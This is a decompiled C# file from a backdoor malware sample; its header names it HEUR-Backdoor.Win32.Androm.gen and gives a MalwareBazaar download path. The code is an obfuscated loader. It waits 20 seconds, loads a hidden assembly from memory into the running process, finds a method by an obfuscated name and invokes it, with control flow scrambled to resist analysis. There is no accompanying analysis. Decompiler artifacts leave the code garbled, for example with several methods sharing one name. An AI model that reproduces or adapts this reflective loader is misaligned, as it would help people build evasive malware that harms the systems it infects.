// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Rldwjsj, Version=3.5.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 13C832CC-2670-41ED-9967-3E16CBCF38A1
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Backdoor.Win32.Androm.gen-7e1cab85784e5b30bbf07932f858012429e784da3c5b81eaea94209af77fa893.exe

using \u0001;
using System;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace \u0001
{
  internal class \u0004
  {
    static void \u0001() => System.Type.GetType("System.Threading.Thread").GetMethod("Sleep", new System.Type[1]
    {
      typeof (TimeSpan)
    }).Invoke((object) null, new object[1]
    {
      (object) TimeSpan.FromSeconds(20.0)
    });

    static void \u0001()
    {
      System.Type[] exportedTypes = \u0002.\u0001.GetExportedTypes();
      int index1 = 0;
      if (false)
        return;
label_15:
      for (; index1 < exportedTypes.Length; ++index1)
      {
        MethodInfo[] methods = exportedTypes[index1].GetMethods();
        int index2 = 0;
        if (true)
          goto label_13;
label_6:
        bool flag;
        int num1 = flag ? 1 : 0;
        MethodInfo methodInfo;
        int num2;
        while (true)
        {
          if (num1 != 0)
          {
            if (true)
            {
              int num3 = (int) MessageBox.Show(methodInfo.Invoke((object) null, (object[]) null).ToString());
            }
            else
              goto label_15;
          }
          if (true)
          {
            num2 = index2;
            if (false)
              num1 = num2;
            else
              goto label_12;
          }
          else
            break;
        }
        break;
label_12:
        index2 = num2 + 1;
label_13:
        if (index2 < methods.Length)
        {
          do
          {
            methodInfo = methods[index2];
          }
          while (false);
          flag = methodInfo.Name == "Iudjbbjsiiuuzkyx";
          goto label_6;
        }
      }
    }

    static void \u0001() => \u0002.\u0001 = Thread.GetDomain().Load(\u0001.\u0001.MemoryStream.ToArray());
  }
}
